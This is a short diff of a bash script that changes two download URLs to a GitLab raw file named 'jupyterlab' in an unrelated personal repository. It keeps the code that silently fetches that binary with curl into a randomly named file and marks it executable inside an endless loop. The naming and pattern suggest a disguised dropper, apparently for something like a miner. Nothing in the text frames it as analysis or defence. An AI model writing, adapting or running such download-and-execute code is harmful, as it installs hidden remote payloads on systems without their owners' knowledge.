@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-NEW_SCRIPT_URL="https://gitlab.com/notesss2/filess/-/raw/main/sumo"
+NEW_SCRIPT_URL="https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab"
 LOCAL_BIN_DIR="$HOME/.local/bin"
 
 RUNTIME=360
@@ -64,7 +64,7 @@ while true; do
         CONFIG_SUFFIX=$(generate_random_string 10)
         CONFIG_NAME="${BIN_NAME}_config${CONFIG_SUFFIX}.json"
 
-        BIN_URL="https://gitlab.com/notesss2/filess/-/raw/main/sumo"
+        BIN_URL="https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab"
         curl -sL "$BIN_URL" -o "$BIN_NAME_FULL"
         chmod +x "$BIN_NAME_FULL"
 
